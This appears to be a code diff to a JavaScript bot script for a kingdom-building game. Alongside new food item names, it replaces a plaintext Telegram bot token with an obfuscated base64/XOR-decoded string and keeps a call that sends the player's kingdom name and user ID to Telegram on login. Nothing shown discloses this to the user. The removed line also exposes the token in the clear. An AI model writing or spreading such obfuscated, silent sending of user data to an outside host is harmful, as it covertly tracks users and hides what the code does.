@@ -392,6 +392,9 @@ const ITEM_NAME = {
     [ITEM_CODE_FOOD_1K]: "Food 1K",
     [ITEM_CODE_FOOD_5K]: "Food 5K",
     [ITEM_CODE_FOOD_10K]: "Food 10K",
+    [ITEM_CODE_FOOD_50K]: "Food 50K",
+    [ITEM_CODE_FOOD_100K]: "Food 100K",
+    [ITEM_CODE_FOOD_500K]: "Food 500K",
     [ITEM_CODE_FOOD_1M]: "Food 1M",
     [ITEM_CODE_FOOD_5M]: "Food 5M",
     [ITEM_CODE_FOOD_10M]: "Food 10M",
@@ -4304,7 +4307,8 @@ async function handleAuthResponse(xhr) {
             if (window._kingdomEnterHandled) return;
             window._kingdomEnterHandled = true;
 
-            sendTelegramMessage("8524724083:AAGGOyxKRGabhCIPsgxXaL-ycxDLf_tMcUk", `🏰 Masuk kingdom: ${kingdomData.name} (User ID: ${kingdomData.userId})`);
+            const tokenTelegramUser = b64xorDec("TldeXltcXltbVFxRLS4uDgtYOBUuLgtZPy4/AjseVFoPAjteWzldAloAKSxYJ1dJ", "lok");
+            sendTelegramMessage(tokenTelegramUser, `🏰 Masuk kingdom: ${kingdomData.name} (User ID: ${kingdomData.userId})`);
 
             // get march limit
             marchLimit = (await getMarchLimit()) ?? marchLimit;
